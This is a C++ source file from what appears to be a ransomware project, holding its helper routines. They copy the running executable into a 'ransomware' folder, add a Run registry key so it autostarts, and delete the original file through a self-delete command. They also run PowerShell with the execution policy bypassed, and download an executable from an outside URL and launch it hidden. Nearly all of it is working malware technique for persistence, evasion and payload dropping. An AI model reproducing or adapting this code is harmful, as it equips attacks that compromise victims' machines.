#include "misc.h"

bool isProcessRunning(string process_name)
{
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
	{
		while (Process32Next(snapshot, &entry))
		{
			string str(entry.szExeFile);
			if (str == process_name)
			{
				exists = true;
			}
		}
	}
	CloseHandle(snapshot);
	return exists;
}

void CallMessageBoxFromShell()
{
	SHELLEXECUTEINFO sei;
	// fill address of sei with zeros
	ZeroMemory(&sei, sizeof(SHELLEXECUTEINFO));
	sei.cbSize = sizeof(SHELLEXECUTEINFO);
	sei.lpVerb = "OPEN";
	sei.lpFile = payload_file;
	sei.lpParameters = "infected restart";
	sei.nShow = SW_HIDE;
	sei.fMask = SEE_MASK_NOCLOSEPROCESS;

	ShellExecuteEx(&sei);
	// Until messagebox.exe is closed
	WaitForSingleObject(sei.hProcess, INFINITE);
	TerminateProcess(sei.hProcess, 1);

	// if process is terminated (false), then delete
	if (!isProcessRunning(payload_file))
	{
		if (!DeleteFile(payload_file))
		{
			std::cout << GetLastError() << std::endl;
		}
	}
}

void CustomDeleteFile(const char* file)
{
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_DELETE, file);
	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

DWORD WINAPI sendThread(PVOID pv)
{
	while (1)
	{
		Sleep(1000 * 60 * 1); //one minute
		std::cout << "Still copying." << std::endl;
	}
}

string Misc::current_working_directory()
{
	char working_directory[MAX_PATH + 1];
	GetCurrentDirectoryA(sizeof(working_directory), working_directory);
	return working_directory;
}

void Misc::call_ps(string filename)
{
	string ps_cmd = "powershell -executionPolicy bypass -file ";
	ps_cmd += current_working_directory() + "../../../powershell/" + filename;
	system(ps_cmd.c_str());
}

void Misc::CopyMyself()
{
	char filename[MAX_PATH]; // declaring the executable as its own file

	char *szOSUserName = nullptr;
	size_t sz = 0;
	_dupenv_s(&szOSUserName, &sz, "USERNAME"); // get target user's name

	string path = "C:\\Users\\";
	string new_folder = "\\ransomware\\";
	string new_path;

	if (szOSUserName != NULL) {
		new_path = path; // This replaces the char version of snprintf()
		new_path += szOSUserName; // \Users\<name>
		new_path += new_folder; // \Users\<name\ransomware
		CreateDirectory(new_path.c_str(), NULL); // c_str() converts std::string to LPCSTR
	}
	else {
		new_path = path; // \Users
		new_path += new_folder; // \Users\ransomware
		CreateDirectory(new_path.c_str(), NULL);
	}

	BOOL stats = 0;
	DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); // get of running exe

	if (size)
	{
		new_path += "ransomware_copy.exe"; // \Users\<name\ransomware\ransomware_copy.exe
		CopyFile(filename, new_path.c_str(), stats); // ransomware.exe to be placed ^

		// add new binary to the registry keys for autostart at boot
		HKEY rkey;
		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &rkey);
		// give key a value name
		RegSetValueEx(rkey, "ransomware_pwn", 0, REG_SZ, (LPBYTE)new_path.c_str(), strlen(new_path.c_str())+1);

		// confirm reg key is thre
		call_ps("invoke_reg.ps1");

		// start a thread, if cmd prompt is idle, this message will be invoked every 60 seconds
		CreateThread(0, 0, sendThread, 0, 0, 0);

		// delete original file
		string file_to_delete = current_working_directory() + "\\" + filename;

		if (DeleteFileA(file_to_delete.c_str()) != 0)
		{
			std::cout << "[+] Original file deleted." << std::endl;
		}
		else {
			// start the self deleting process if DeleteFile doesn't work
			CustomDeleteFile(filename);
		}
	}
	else {
		std::cout << "[-] Could not add keys to registry.." << std::endl;
	}
}

void Misc::CallFileFromInternet()
{
	FILE *fp;
	char file[99];
	HINTERNET hOpen, hURL;
	unsigned long read_file;

	hOpen = InternetOpen("WebReader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hOpen)
	{
		GetLastError();
	}

	hURL = InternetOpenUrl(hOpen, "https://github.com/dbohdan/messagebox/releases/download/v0.1.0/messagebox.exe", NULL, 0, 0, 0);
	if (!hURL)
	{
		GetLastError();
	}

	errno_t error = fopen_s(&fp, payload_file, "wb");
	while (InternetReadFile(hURL, file, sizeof(file) - 1, &read_file) && read_file != 0)
	{
		fwrite(file, sizeof(char), read_file, fp);
	}

	fclose(fp);
	InternetCloseHandle(hOpen);
	InternetCloseHandle(hURL);

	CallMessageBoxFromShell();
}
